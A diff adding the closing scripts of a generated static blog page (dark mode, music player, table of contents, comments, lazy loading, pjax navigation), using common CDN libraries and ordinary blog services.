+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    updateDarkModeIcon(isDark);
+  });
+
+  function toggleDarkMode() {
+    const isDark = $(document.body).hasClass('darkModel');
+    $(document.body).toggleClass('darkModel');
+    localStorage.setItem('dark', !isDark);
+    updateDarkModeIcon(!isDark);
+  }
+
+  function updateDarkModeIcon(isDark) {
+    const iconElement = document.getElementById('darkIcon');
+    if (isDark) {
+      iconElement.classList.remove('fa-moon');
+      iconElement.classList.add('fa-lightbulb');
+    } else {
+      iconElement.classList.remove('fa-lightbulb');
+      iconElement.classList.add('fa-moon');
+    }
+  }
+</script>
+
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script defer src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="tencent"
+  type="playlist"
+  id="8062553743"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script defer src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script defer src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script async>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script async type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: 20,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的图片标签(getPhotoOnline)里的内容 -->
+<script>
+  function loadPhotoOnlineJS() {
+    if ($(".post-detail").find(".getJsonPhoto-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getPhotoOnline/index.js');
+  };
+  $(function () {
+    loadPhotoOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getPhotoJson == "undefined") {
+      loadPhotoOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的talk标签(getTalkOnline)里的内容 -->
+<script>
+  function loadTalkOnlineJS() {
+    if ($(".post-detail").find(".getJsonTalk-api").length == 0) {
+      return;
+    } 
+    loadScript('https://cdnjs.cloudflare.com/ajax/libs/waterfall.js/1.0.2/waterfall.min.js'); // 瀑布流插件，https://raphamorim.io/waterfall.js/
+    loadScript('/js/getTalkOnline/index.js');
+  };
+  $(function () {
+    loadTalkOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getTalkJson == "undefined") {
+      loadTalkOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的site-card标签(getSiteOnline)里的内容 -->
+<script>
+  function loadSiteOnlineJS() {
+    if ($(".post-detail").find(".getJsonSite-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getSiteOnline/index.js');
+  };
+  $(function () {
+    loadSiteOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getSiteJson == "undefined") {
+      loadSiteOnlineJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+        <script type="text/javascript">
+  var utteranceComment = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceComment.Theme = 'github-dark';
+    } else {
+      utteranceComment.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceComment.Theme)
+      utterances.setAttribute('repo', '')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceComment.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+      
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script async src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script async src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
